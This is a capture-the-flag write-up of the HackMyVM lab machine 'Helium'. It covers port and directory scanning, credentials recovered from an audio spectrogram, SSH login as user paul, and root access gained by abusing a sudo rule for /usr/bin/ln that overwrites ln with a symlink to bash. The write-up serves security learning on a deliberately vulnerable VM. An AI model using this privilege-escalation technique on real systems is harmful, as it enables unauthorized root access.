# Helium

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Helium | sml | Beginner | HackMyVM |

**Summary:** Helium is a beginner-level HackMyVM machine that demonstrates audio steganography and basic privilege escalation techniques. The attack path involves discovering a web application with hidden audio files, extracting credentials from audio steganography using spectrogram analysis in Audacity, gaining SSH access, and escalating privileges through a misconfigured sudo permission for the `ln` command. The machine emphasizes the importance of thorough enumeration and understanding various forms of data hiding techniques.

---

## Reconnaissance

### Network Discovery

First, I performed network scanning to identify the target machine in the virtual environment:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.52 08:00:27:79:44:CE VirtualBox
```

The target was identified at IP address `192.168.100.52`.

### Port Scanning

I conducted comprehensive port scanning to identify open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sV -sC -p- 192.168.100.52
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 06:46 WIB
Nmap scan report for 192.168.100.52
Host is up (0.0093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12:f6:55:5f:c6:fa:fb:14:15:ae:4a:2b:38:d8:4a:30 (RSA)
|   256 b7:ac:87:6d:c4:f9:e3:9a:d4:6e:e0:4f:da:aa:22:20 (ECDSA)
|_  256 fe:e8:05:af:23:4d:3a:82:2a:64:9b:f7:35:e4:44:4a (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: RELAX
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.69 seconds
```

UDP port scanning was also performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sU --top-ports 100 192.168.100.52
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 06:48 WIB
Nmap scan report for 192.168.100.52
Host is up (0.00080s latency).
All 100 scanned ports on 192.168.100.52 are in ignored states.
Not shown: 57 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 55.67 seconds
```

**Results:** Only TCP ports 22 (SSH) and 80 (HTTP) were found to be open.

### Web Application Analysis

I examined the HTTP service running on port 80:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I 192.168.100.52                                                                                              
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 30 Jan 2026 23:50:53 GMT
Content-Type: text/html
Content-Length: 530
Last-Modified: Sun, 22 Nov 2020 19:21:02 GMT
Connection: keep-alive
ETag: "5fbaba1e-212"
Accept-Ranges: bytes

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl 192.168.100.52
<title>RELAX</title>
<!doctype html>
<html lang="en">

<!-- Please paul, stop uploading weird .wav files using /upload_sound -->

<head>
<style>
body {
  background-image: url('screen-1.jpg');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: 100% 100%;
}
</style>
    <link href="bootstrap.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
<audio src="relax.wav" preload="auto loop" controls></audio>
</body>
```

**Key Findings:**
- HTML comment reveals a user named "paul" uploading .wav files
- An endpoint `/upload_sound` is mentioned
- Audio file `relax.wav` is embedded in the page

I downloaded the `relax.wav` file for analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ wget 192.168.100.52/relax.wav
Prepended http:// to '192.168.100.52/relax.wav'
--2026-01-31 06:52:08--  http://192.168.100.52/relax.wav
Connecting to 192.168.100.52:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250334 (244K) [application/octet-stream]
Saving to: 'relax.wav'

relax.wav                     100%[=================================================>] 244.47K  --.-KB/s    in 0.05s

2026-01-31 06:52:08 (4.38 MB/s) - 'relax.wav' saved [250334/250334]
```

The audio file appeared to contain only background sound with no immediately obvious hidden content.

### Directory Enumeration

I performed directory bruteforcing to discover additional endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ feroxbuster -u http://192.168.100.52/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.52/
 🚩  In-Scope Url          │ 192.168.100.52
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       23c http://192.168.100.52/bootstrap.min.css
200      GET       22l       46w      530c http://192.168.100.52/
301      GET        7l       12w      185c http://192.168.100.52/yay => http://192.168.100.52/yay/
```

**Discovery:** A new directory `/yay/` was found during enumeration.

### Bootstrap.min.css Analysis

Since the feroxbuster scan revealed a `bootstrap.min.css` file, I investigated its contents:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ curl -I 192.168.100.52/bootstrap.min.css
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 30 Jan 2026 23:59:24 GMT
Content-Type: text/css
Content-Length: 23
Last-Modified: Sun, 22 Nov 2020 19:22:47 GMT
Connection: keep-alive
ETag: "5fbaba87-17"
Accept-Ranges: bytes

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ curl 192.168.100.52/bootstrap.min.css
/yay/mysecretsound.wav
```

**Critical Finding:** The bootstrap.min.css file doesn't contain CSS code but instead reveals the path to another audio file: `/yay/mysecretsound.wav`

---

## Initial Access

### Audio File Discovery

Armed with the path discovered in the bootstrap.min.css file, I accessed the hidden audio file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ curl -I 192.168.100.52/yay/mysecretsound.wav
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 30 Jan 2026 23:59:57 GMT
Content-Type: application/octet-stream
Content-Length: 204814
Last-Modified: Sun, 22 Nov 2020 19:21:02 GMT
Connection: keep-alive
ETag: "5fbaba1e-3200e"
Accept-Ranges: bytes
```

The file exists! I downloaded it for analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ wget 192.168.100.52/yay/mysecretsound.wav
Prepended http:// to '192.168.100.52/yay/mysecretsound.wav'
--2026-01-31 07:00:15--  http://192.168.100.52/yay/mysecretsound.wav
Connecting to 192.168.100.52:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 204814 (200K) [application/octet-stream]
Saving to: 'mysecretsound.wav'

mysecretsound.wav      100%[==========================>] 200.01K  --.-KB/s    in 0.1s

2026-01-31 07:00:15 (1.53 MB/s) - 'mysecretsound.wav' saved [204814/204814]
```

### Audio Steganography Analysis

I analyzed the audio file using Audacity to look for hidden information. By examining the spectrogram view, I discovered hidden text embedded in the audio frequencies:
The initial spectrogram view showed patterns that suggested hidden data. By adjusting the view and selecting specific portions of the audio, I could reveal hidden text:

![](image-4.png)

**Critical Finding:** The spectrogram analysis revealed the string: `dan[REDACTED]`

Based on the HTML comment mentioning "paul" as the user uploading files, I deduced that:
- Username: `paul`
- Password: `dan[REDACTED]` (the string found in the audio steganography)

### SSH Access

Using the discovered credentials, I attempted SSH login:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helium]
└─$ ssh paul@192.168.100.52
...
paul@192.168.100.52's password:
Linux helium 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
...
paul@helium:~$ id
uid=1000(paul) gid=1000(paul) groups=1000(paul),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
paul@helium:~$ ls -la
total 32
drwxr-xr-x 3 paul paul 4096 Nov 22  2020 .
drwxr-xr-x 3 root root 4096 Nov 22  2020 ..
-rw-r--r-- 1 paul paul  220 Nov 22  2020 .bash_logout
-rw-r--r-- 1 paul paul 3526 Nov 22  2020 .bashrc
drwxr-xr-x 3 paul paul 4096 Nov 22  2020 .local
-rw-r--r-- 1 paul paul  807 Nov 22  2020 .profile
-rw------- 1 paul paul   17 Nov 22  2020 user.txt
-rw------- 1 paul paul   52 Nov 22  2020 .Xauthority
```

**Success!** Initial access was gained as user `paul`.

---

## Privilege Escalation

### Sudo Privileges Analysis

I immediately checked for sudo privileges:

```bash
paul@helium:~$ sudo -l
Matching Defaults entries for paul on helium:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on helium:
    (ALL : ALL) NOPASSWD: /usr/bin/ln
paul@helium:~$ ls -la /usr/bin/ln
-rwxr-xr-x 1 root root 68552 Feb 28  2019 /usr/bin/ln
```

**Critical Finding:** The user `paul` can execute `/usr/bin/ln` with sudo privileges without a password.

### GTFOBins Research

I consulted GTFOBins for privilege escalation techniques using the `ln` command:

![](image-3.png)

The GTFOBins documentation shows that `ln` can be exploited for privilege escalation through the following method:
- The technique involves overriding `ln` itself with a symlink to a shell
- When executed with sudo, this provides elevated privileges

### Exploitation

Following the GTFOBins technique:

```bash
paul@helium:~$ sudo /usr/bin/ln -fs /bin/bash /usr/bin/ln
paul@helium:~$ sudo /usr/bin/ln
root@helium:/home/paul# id
uid=0(root) gid=0(root) groups=0(root)
root@helium:/home/paul# cd
root@helium:~# pwd
/root
root@helium:~# ls
root.txt
root@helium:~# cat /home/paul/user.txt /root/root.txt
ilo[REDACTED]
ilo[REDACTED]
```

**Success!** Root access was achieved through the `ln` command privilege escalation.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning and identified target at 192.168.100.52 with SSH (22) and HTTP (80) services running on nginx 1.14.2
2. **Web Enumeration**: Discovered HTML comment revealing user 'paul' and `/upload_sound` endpoint, found `/yay/` directory and bootstrap.min.css file through bruteforcing
3. **Hidden Path Discovery**: Analyzed bootstrap.min.css content which revealed the path `/yay/mysecretsound.wav` instead of actual CSS code
4. **Audio Steganography**: Downloaded the hidden audio file and analyzed it using Audacity spectrogram view to reveal embedded credentials `dan[REDACTED]`
5. **Initial Access**: Used discovered credentials (paul:`dan[REDACTED]`) to gain SSH access to the target system
6. **Privilege Escalation**: Exploited sudo privileges for `/usr/bin/ln` command using GTFOBins technique to create a symbolic link to bash, achieving root access